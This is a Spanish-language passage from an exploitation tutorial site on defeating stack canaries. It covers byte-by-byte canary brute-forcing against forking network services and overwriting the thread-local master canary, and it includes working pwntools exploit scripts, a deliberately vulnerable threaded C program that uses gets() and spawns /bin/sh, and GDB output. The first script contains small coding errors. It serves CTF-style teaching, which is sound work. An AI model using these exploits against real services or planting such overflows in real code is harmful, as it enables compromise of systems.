# BF Forked & Threaded Stack Canaries

{{#include ../../../../banners/hacktricks-training.md}}

**Si te enfrentas a un binario protegido por un canario y PIE (Ejecutable Independiente de Posición), probablemente necesites encontrar una forma de eludirlos.**

![](<../../../../images/image (144).png>)

> [!NOTE]
> Ten en cuenta que **`checksec`** podría no encontrar que un binario está protegido por un canario si este fue compilado estáticamente y no es capaz de identificar la función.\
> Sin embargo, puedes notar esto manualmente si encuentras que un valor se guarda en la pila al comienzo de una llamada a función y este valor se verifica antes de salir.

## Fuerza bruta del Canario

La mejor manera de eludir un canario simple es si el binario es un programa **que crea procesos hijos cada vez que estableces una nueva conexión** con él (servicio de red), porque cada vez que te conectas a él **se usará el mismo canario**.

Entonces, la mejor manera de eludir el canario es simplemente **forzarlo de forma bruta carácter por carácter**, y puedes averiguar si el byte del canario adivinado fue correcto comprobando si el programa se ha bloqueado o continúa su flujo regular. En este ejemplo, la función **fuerza bruta un canario de 8 Bytes (x64)** y distingue entre un byte adivinado correctamente y un byte incorrecto simplemente **comprobando** si se envía una **respuesta** de vuelta por el servidor (otra forma en **otra situación** podría ser usando un **try/except**):

### Ejemplo 1

Este ejemplo está implementado para 64 bits, pero podría implementarse fácilmente para 32 bits.
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
### Ejemplo 2

Esto está implementado para 32 bits, pero esto podría cambiarse fácilmente a 64 bits.\
También tenga en cuenta que para este ejemplo el **programa esperaba primero un byte para indicar el tamaño de la entrada** y la carga útil.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
## Hilos

Los hilos del mismo proceso también **compartirán el mismo token canario**, por lo tanto, será posible **forzar** un canario si el binario genera un nuevo hilo cada vez que ocurre un ataque.

Un desbordamiento de búfer en una función con hilos protegida con canario puede ser utilizado para modificar el canario maestro del proceso. Como resultado, la mitigación es inútil porque la verificación se utiliza con dos canarios que son iguales (aunque modificados).

### Ejemplo

El siguiente programa es vulnerable a Buffer Overflow, pero está compilado con canario:
```c
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

// gcc thread_canary.c -no-pie -l pthread -o thread_canary

void win() {
execve("/bin/sh", NULL, NULL);
}

void* vuln() {
char data[0x20];
gets(data);
}

int main() {
pthread_t thread;

pthread_create(&thread, NULL, vuln, NULL);
pthread_join(thread, NULL);

return 0;
}
```
Nota que `vuln` se llama dentro de un hilo. En GDB podemos echar un vistazo a `vuln`, específicamente, en el punto donde el programa llama a `gets` para leer datos de entrada:
```bash
gef> break gets
Breakpoint 1 at 0x4010a0
gef> run
...
gef> x/10gx $rdi
0x7ffff7d7ee20: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee30: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee40: 0x0000000000000000      0x493fdc653a156800
0x7ffff7d7ee50: 0x0000000000000000      0x00007ffff7e17ac3
0x7ffff7d7ee60: 0x0000000000000000      0x00007ffff7d7f640
```
La parte anterior representa la dirección de `data`, donde el programa escribirá la entrada del usuario. El stack canary se encuentra en `0x7ffff7d7ee48` (`0x493fdc653a156800`), y la dirección de retorno está en `0x7ffff7d7ee50` (`0x00007ffff7e17ac3`):
```bash
gef> telescope $rdi 8 -n
0x7ffff7d7ee20|+0x0000|+000: 0x0000000000000000  <-  $rdi
0x7ffff7d7ee28|+0x0008|+001: 0x0000000000000000
0x7ffff7d7ee30|+0x0010|+002: 0x0000000000000000
0x7ffff7d7ee38|+0x0018|+003: 0x0000000000000000
0x7ffff7d7ee40|+0x0020|+004: 0x0000000000000000
0x7ffff7d7ee48|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7ee50|+0x0030|+006: 0x0000000000000000  <-  $rbp
0x7ffff7d7ee58|+0x0038|+007: 0x00007ffff7e17ac3 <start_thread+0x2f3>  ->  0xe8ff31fffffe6fe9  <-  retaddr[2]
```
Nota que las direcciones de la pila no pertenecen a la pila real:
```bash
gef> vmmap stack
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x00007ffff7580000 0x00007ffff7d83000 0x0000000000803000 0x0000000000000000 rw- <tls-th1><stack-th2>  <-  $rbx, $rsp, $rbp, $rsi, $rdi, $r12
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $r9, $r15
```
La pila del hilo se coloca por encima del Almacenamiento Local de Hilos (TLS), donde se almacena el canario maestro:
```bash
gef> tls
$tls = 0x7ffff7d7f640
...
---------------------------------------------------------------------------- TLS ----------------------------------------------------------------------------
0x7ffff7d7f640|+0x0000|+000: 0x00007ffff7d7f640  ->  [loop detected]  <-  $rbx, $r12
0x7ffff7d7f648|+0x0008|+001: 0x00000000004052b0  ->  0x0000000000000001
0x7ffff7d7f650|+0x0010|+002: 0x00007ffff7d7f640  ->  [loop detected]
0x7ffff7d7f658|+0x0018|+003: 0x0000000000000001
0x7ffff7d7f660|+0x0020|+004: 0x0000000000000000
0x7ffff7d7f668|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7f670|+0x0030|+006: 0xb79b79966e9916c4  <-  PTR_MANGLE cookie
0x7ffff7d7f678|+0x0038|+007: 0x0000000000000000
...
```
> [!NOTE]
> Algunas de las funciones de GDB mencionadas anteriormente están definidas en una extensión llamada [bata24/gef](https://github.com/bata24/gef), que tiene más características que el habitual [hugsy/gef](https://github.com/hugsy/gef).

Como resultado, un gran Buffer Overflow puede permitir modificar tanto el stack canary como el master canary en el TLS. Este es el offset:
```bash
gef> p/x 0x7ffff7d7f668 - $rdi
$1 = 0x848
```
Este es un exploit corto para llamar a `win`:
```python
from pwn import *

context.binary = 'thread_canary'

payload  = b'A' * 0x28                    # buffer overflow offset
payload += b'BBBBBBBB'                    # overwritting stack canary
payload += b'A' * 8                       # saved $rbp
payload += p64(context.binary.sym.win)    # return address
payload += b'A' * (0x848 - len(payload))  # padding
payload += b'BBBBBBBB'                    # overwritting master canary

io = context.binary.process()
io.sendline(payload)
io.interactive()
```
## Otros ejemplos y referencias

- [https://guyinatuxedo.github.io/07-bof_static/dcquals16_feedme/index.html](https://guyinatuxedo.github.io/07-bof_static/dcquals16_feedme/index.html)
- 64 bits, sin PIE, nx, canario BF, escribir en alguna memoria un ROP para llamar a `execve` y saltar allí.
- [http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)
- 64 bits, sin PIE, nx, modificar el canario de hilo y maestro.
